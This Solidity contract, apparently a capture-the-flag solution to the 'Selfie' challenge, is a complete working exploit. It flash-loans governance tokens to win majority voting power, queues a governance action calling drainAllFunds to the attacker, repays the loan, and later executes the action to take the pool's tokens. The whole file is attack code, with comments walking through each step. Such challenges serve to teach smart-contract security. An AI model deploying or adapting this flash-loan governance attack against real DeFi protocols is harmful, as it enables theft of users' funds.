// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;

    function governance() external view returns (address);

    function token() external view returns (address);
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

// This interface isn't exactly correct but it works for our case
interface IDVTSnapshot is IERC20 {
    function snapshot() external returns (uint256);
}

contract SelfieAttacker {
    struct GovernanceAction {
        address receiver;
        bytes data;
        uint256 weiAmount;
        uint256 proposedAt;
        uint256 executedAt;
    }

    ISelfiePool pool = ISelfiePool(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
    ISimpleGovernance governance = ISimpleGovernance(pool.governance());
    IDVTSnapshot token = IDVTSnapshot(pool.token());
    uint256 actionId = 0;

    uint256 public constant FLASH_LOAN_AMOUNT = 1500000 ether;

    function loanAndQueueMaliciousAction() public {
        // First, flash loan all the governance tokens from the pool. This
        // calls receiveTokens() below, which will queue the action for us
        pool.flashLoan(1500000 ether);
    }

    function receiveTokens(address, uint256) public {
        // While we have the loan, we queue an action in the governance
        // contract to drain all the funds from the pool. We can do this because
        // of the immense amount of governance tokens we have, which gives us a
        // ton of voting power. The voting power calculation essentially just
        // checks if the amount of tokens we hold is greater than half the
        // totalSupply. Since totalSupply is 2 million and we hold 1.5 million,
        // this works.
        //
        // We first have to snapshot the token here, so it can track our funds
        // correctly
        token.snapshot();
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSelector(pool.drainAllFunds.selector, address(this)),
            0
        );

        // Now, pay back the flash loan
        token.transfer(address(pool), FLASH_LOAN_AMOUNT);
    }

    // Call this function after two days have passed
    function executeMaliciousAction() public {
        // Drain all the funds from the pool
        governance.executeAction(actionId);

        // Transfer to the attacker, pool contains FLASH_LOAN_AMOUNT tokens
        token.transfer(msg.sender, FLASH_LOAN_AMOUNT);
    }
}
